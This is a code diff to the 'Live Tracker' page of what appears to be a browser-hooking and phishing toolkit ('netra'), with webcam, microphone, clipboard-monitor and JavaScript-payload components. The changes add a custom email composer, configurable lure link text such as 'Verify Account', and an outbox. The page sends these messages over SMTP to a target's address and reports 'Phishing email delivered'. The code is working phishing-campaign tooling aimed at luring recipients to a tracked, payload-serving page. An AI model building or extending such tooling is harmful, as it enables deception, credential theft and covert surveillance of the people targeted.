@@ -1,4 +1,3 @@
-
 'use client';
 
 import { useState, useEffect, useRef } from 'react';
@@ -13,7 +12,7 @@ import { ClipboardMonitor } from '@/components/clipboard-monitor';
 import { SessionHistory } from '@/components/live-tracker/session-history';
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
 import { Badge } from '@/components/ui/badge';
-import { Webcam, Video, Mic, Terminal, Info, Mail, Sparkles, Send as SendIcon, Save, PlusCircle } from 'lucide-react';
+import { Webcam, Video, Mic, Terminal, Info, Mail, Sparkles, Send as SendIcon, Save, PlusCircle, Link, Eye, ClipboardCopy } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
 import { useAuth } from '@/hooks/use-auth';
@@ -36,10 +35,11 @@ import { zodResolver } from '@hookform/resolvers/zod';
 import { z } from 'zod';
 import { ScrollArea } from '@/components/ui/scroll-area';
 import { initialTemplates, type Template } from '@/lib/templates';
-
+import { EmailOutbox, SentEmail } from '@/components/email-outbox';
 
 const emailFormSchema = z.object({
   recipientEmail: z.string().email(),
+  linkText: z.string().min(1, 'Link text is required'),
 });
 
 const newTemplateSchema = z.object({
@@ -59,6 +59,11 @@ const getTemplateVariables = (template: Template | null): string[] => {
     const uniqueMatches = [...new Set(matches)];
     return uniqueMatches.map(v => v.replace(/[{}]/g, ''));
 };
+
+const customEmailSchema = z.object({
+    subject: z.string().min(1, 'Subject is required.'),
+    body: z.string().min(1, 'Body is required.'),
+});
 
 
 export default function LiveTrackerPage() {
@@ -88,13 +93,16 @@ export default function LiveTrackerPage() {
   const [isSendingEmail, setIsSendingEmail] = useState(false);
   const [smtpConfig, setSmtpConfig] = useState<SmtpConfig | null>(null);
   const [hostedUrlForEmail, setHostedUrlForEmail] = useState<string>('');
+  const { value: sentEmails, setValue: setSentEmails } = useLocalStorage<SentEmail[]>('netra-email-outbox', []);
+  const [currentEmailTab, setCurrentEmailTab] = useState('select');
   
   const emailForm = useForm<z.infer<typeof emailFormSchema>>({ 
     resolver: zodResolver(emailFormSchema),
-    defaultValues: { recipientEmail: '' },
+    defaultValues: { recipientEmail: '', linkText: 'Click Here' },
   });
   const newTemplateForm = useForm<z.infer<typeof newTemplateSchema>>({ resolver: zodResolver(newTemplateSchema), defaultValues: { name: '', subject: '', body: '' } });
   const aiTemplateForm = useForm<z.infer<typeof aiTemplateSchema>>({ resolver: zodResolver(aiTemplateSchema), defaultValues: { scenario: 'A critical security alert requiring immediate action.' } });
+  const customEmailForm = useForm<z.infer<typeof customEmailSchema>>({ resolver: zodResolver(customEmailSchema), defaultValues: { subject: '', body: '' }});
 
 
   const handleSelectPayload = (payload: JsPayload) => {
@@ -239,7 +247,7 @@ export default function LiveTrackerPage() {
     setVariableValues({});
     newTemplateForm.reset();
     aiTemplateForm.reset();
-    emailForm.reset();
+    emailForm.reset({ recipientEmail: '', linkText: 'Click Here' });
     setIsEmailModalOpen(true);
   };
   
@@ -250,6 +258,7 @@ export default function LiveTrackerPage() {
     localStorage.setItem('netra-templates', JSON.stringify(updatedTemplates));
     setSelectedTemplate(newTemplate);
     toast({ title: "Template Saved", description: "Your new template has been saved and selected."});
+    setCurrentEmailTab('select');
     newTemplateForm.reset();
   };
   
@@ -277,23 +286,44 @@ export default function LiveTrackerPage() {
       toast({ variant: 'destructive', title: 'SMTP Not Configured', description: 'Please configure email settings.'});
       return;
     }
-    if (!selectedTemplate) {
-      toast({ variant: 'destructive', title: 'No Template Selected' });
-      return;
+    
+    let subject = '';
+    let body = '';
+    
+    if (currentEmailTab === 'custom') {
+        const customValues = customEmailForm.getValues();
+        subject = customValues.subject;
+        body = customValues.body;
+    } else {
+        if (!selectedTemplate) {
+            toast({ variant: 'destructive', title: 'No Template Selected' });
+            return;
+        }
+        subject = selectedTemplate.subject || 'Important Notification';
+        body = selectedTemplate.body;
     }
-
+    
     setIsSendingEmail(true);
     try {
-      let body = renderPreview(selectedTemplate.body, true);
-      let subject = renderPreview(selectedTemplate.subject);
+      let finalBody = renderPreview(body, true);
+      let finalSubject = renderPreview(subject);
 
       await sendTestEmail({
         ...smtpConfig,
         recipientEmail: values.recipientEmail,
-        subject: subject || 'Important Notification',
-        html: body,
-        text: body.replace(/<[^>]+>/g, ''),
+        subject: finalSubject,
+        html: finalBody,
+        text: finalBody.replace(/<[^>]+>/g, ''),
       });
+
+      const newSentEmail: SentEmail = {
+          id: crypto.randomUUID(),
+          recipient: values.recipientEmail,
+          subject: finalSubject,
+          timestamp: new Date().toISOString(),
+          status: 'Sent'
+      };
+      setSentEmails([newSentEmail, ...sentEmails]);
 
       toast({ title: 'Email Sent!', description: `Phishing email delivered to ${values.recipientEmail}.`});
       setIsEmailModalOpen(false);
@@ -307,7 +337,6 @@ export default function LiveTrackerPage() {
   useEffect(() => {
     const variables = getTemplateVariables(selectedTemplate);
     setTemplateVariables(variables);
-    // Reset values when template changes
     setVariableValues({});
   }, [selectedTemplate]);
   
@@ -319,20 +348,16 @@ export default function LiveTrackerPage() {
       if (!text) return '';
       let renderedText = text;
       
-      const allValues = { ...variableValues, link: hostedUrlForEmail };
+      const allValues = { ...variableValues };
+      const linkText = emailForm.getValues('linkText');
 
       for (const key in allValues) {
           const value = allValues[key] || (forSending ? '' : `{{${key}}}`);
           renderedText = renderedText.replace(new RegExp(`\\{\\{${key}\\}\\}`, 'g'), value);
       }
       
-      // Special handling for the link for better previewing
-      if(!forSending) {
-           renderedText = renderedText.replace(/\[Link\]|\[(.*?)\]/gi, `<a href='#' class='text-accent font-bold underline'>[$1]</a>`);
-      } else {
-           renderedText = renderedText.replace(/\[Link\]|\[(.*?)\]/gi, `<a href='${hostedUrlForEmail}' target='_blank' rel='noopener noreferrer' style='color:hsl(var(--accent));font-weight:bold;text-decoration:underline;'>$1</a>`);
-      }
-
+      const linkHtml = `<a href="${hostedUrlForEmail}" target="_blank" rel="noopener noreferrer" style="color:hsl(var(--accent));font-weight:bold;text-decoration:underline;">${linkText}</a>`;
+      renderedText = renderedText.replace(/\[Link\]|\[(.*?)\]/gi, linkHtml);
       return renderedText;
   }
 
@@ -387,6 +412,7 @@ export default function LiveTrackerPage() {
         <div className="xl:col-span-2 flex flex-col gap-6">
           <LiveTracker sessions={sessionsMap} selectedSessionId={selectedSessionId} />
           <JavaScriptLibrary onSelectPayload={setSelectedPayload}/>
+          <EmailOutbox sentEmails={sentEmails} />
         </div>
         <div className="xl:col-span-1 flex flex-col gap-6">
           <SessionHistory sessions={sessionsMap} setSessions={setSessions} selectedSessionId={selectedSessionId} setSelectedSessionId={setSelectedSessionId} resetState={resetStateForSession} />
@@ -447,9 +473,10 @@ export default function LiveTrackerPage() {
           )}
           <div className="grid md:grid-cols-2 gap-8 py-4">
             <div className="space-y-4">
-              <Tabs defaultValue="select">
-                <TabsList className="grid w-full grid-cols-3">
+              <Tabs defaultValue="select" value={currentEmailTab} onValueChange={setCurrentEmailTab}>
+                <TabsList className="grid w-full grid-cols-4">
                   <TabsTrigger value="select">Select</TabsTrigger>
+                  <TabsTrigger value="custom">Custom</TabsTrigger>
                   <TabsTrigger value="new">New</TabsTrigger>
                   <TabsTrigger value="ai">AI</TabsTrigger>
                 </TabsList>
@@ -461,6 +488,12 @@ export default function LiveTrackerPage() {
                       {emailTemplates.map(t => <SelectItem key={t.id} value={t.id}>{t.name}</SelectItem>)}
                     </ScrollArea></SelectContent>
                   </Select>
+                </TabsContent>
+                 <TabsContent value="custom" className="space-y-3">
+                   <Form {...customEmailForm}>
+                     <FormField control={customEmailForm.control} name="subject" render={({field}) => (<FormItem><Input placeholder="Email Subject" {...field}/><FormMessage/></FormItem>)}/>
+                     <FormField control={customEmailForm.control} name="body" render={({field}) => (<FormItem><Textarea placeholder="Email body... Use {{variables}} and [Link] for personalization." {...field} className="h-40 font-mono"/><FormMessage/></FormItem>)}/>
+                    </Form>
                 </TabsContent>
                 <TabsContent value="new">
                   <Form {...newTemplateForm}><form onSubmit={newTemplateForm.handleSubmit(handleSaveNewTemplate)} className="space-y-3">
@@ -480,12 +513,12 @@ export default function LiveTrackerPage() {
                    </form></Form>
                 </TabsContent>
               </Tabs>
-              {templateVariables.length > 0 && (
+              {templateVariables.length > 0 && currentEmailTab === 'select' && (
                 <div className="space-y-2 border-t pt-4">
-                  <Label>Personalization</Label>
+                  <Label>Personalization Variables</Label>
                   {templateVariables.map(variable => (
                     <div key={variable} className="grid grid-cols-3 items-center gap-4">
-                      <Label htmlFor={`var-${variable}`} className="text-right">{variable}</Label>
+                      <Label htmlFor={`var-${variable}`} className="text-right text-xs font-mono">{`{{${variable}}}`}</Label>
                       <Input id={`var-${variable}`} value={variableValues[variable] || ''} onChange={(e) => handleVariableChange(variable, e.target.value)} className="col-span-2"/>
                     </div>
                   ))}
@@ -493,8 +526,9 @@ export default function LiveTrackerPage() {
               )}
               <Separator />
                <Form {...emailForm}><form onSubmit={emailForm.handleSubmit(onSendEmail)} className="space-y-4">
-                <FormField control={emailForm.control} name="recipientEmail" render={({field}) => (<FormItem><Label>Recipient Email</Label><Input type="email" placeholder="target@example.com" {...field}/><FormMessage/></FormItem>)}/>
-                <Button type="submit" className="w-full" disabled={!smtpConfig || isSendingEmail || !selectedTemplate}>
+                 <FormField control={emailForm.control} name="linkText" render={({ field }) => (<FormItem><Label>Link Display Text</Label><Input placeholder="e.g., Click Here, Verify Account" {...field} /><FormMessage /></FormItem>)} />
+                 <FormField control={emailForm.control} name="recipientEmail" render={({field}) => (<FormItem><Label>Recipient Email</Label><Input type="email" placeholder="target@example.com" {...field}/><FormMessage /></FormItem>)}/>
+                 <Button type="submit" className="w-full" disabled={!smtpConfig || isSendingEmail}>
                     {isSendingEmail ? <Loader2 className="mr-2 h-4 w-4 animate-spin"/> : <SendIcon className="mr-2 h-4 w-4"/>}
                     Send Email
                 </Button>
@@ -504,7 +538,14 @@ export default function LiveTrackerPage() {
               <Label>Live Preview</Label>
               <Card className="h-[500px]">
                 <CardContent className="p-4 h-full overflow-y-auto">
-                  {!selectedTemplate ? <p className="text-muted-foreground text-center pt-20">Select or generate a template.</p> : (
+                  {currentEmailTab === 'custom' ? (
+                     <div className="prose prose-sm dark:prose-invert">
+                      <h3>{renderPreview(customEmailForm.watch('subject'))}</h3>
+                      <div dangerouslySetInnerHTML={{ __html: renderPreview(customEmailForm.watch('body')).replace(/\\n/g, '<br />') }}/>
+                    </div>
+                  ) : !selectedTemplate ? (
+                    <p className="text-muted-foreground text-center pt-20">Select or generate a template.</p>
+                  ) : (
                     <div className="prose prose-sm dark:prose-invert">
                       <h3>{renderPreview(selectedTemplate.subject)}</h3>
                       <div dangerouslySetInnerHTML={{ __html: renderPreview(selectedTemplate.body) }}/>
